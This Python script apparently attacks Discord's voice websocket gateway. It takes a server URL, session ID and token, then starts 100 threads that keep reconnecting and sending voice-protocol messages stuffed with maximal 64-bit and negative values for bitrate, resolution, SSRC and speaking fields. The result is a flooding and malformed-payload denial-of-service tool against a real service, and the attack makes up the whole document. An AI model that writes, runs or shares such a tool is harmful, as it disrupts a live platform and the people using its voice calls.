import json as js2,threading
import websocket

ws_server = input("websocket: ")
serverid = input("server id: ")
myuid = input("your user id: ")
sessionid = input("session id: ")
tokenn = input("token (not auth): ")
def fatman():
    while True:
        try:
            ws = websocket.create_connection(f"{ws_server}",origin=f"https://discord.com")
            ws.send(js2.dumps({"op":0,"d":{"server_id":f"{serverid}","user_id":f"{myuid}","session_id":f"{sessionid}","token":f"{tokenn}","video":True,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":True,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":5,"d":{"speaking":9223372036854775807,"delay":-1,"ssrc":9223372036854775807}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":3,"d":-1},separators=(",", ":")).encode("UTF-8"))
            print("sent")
            ws.close()
        except Exception as e:
            print(e)
            pass

threads = []

for i in range(100):
    t = threading.Thread(target=fatman)
    t.daemon = True
    threads.append(t)

for i in range(100):
    threads[i].start()

for i in range(100):
    threads[i].join()
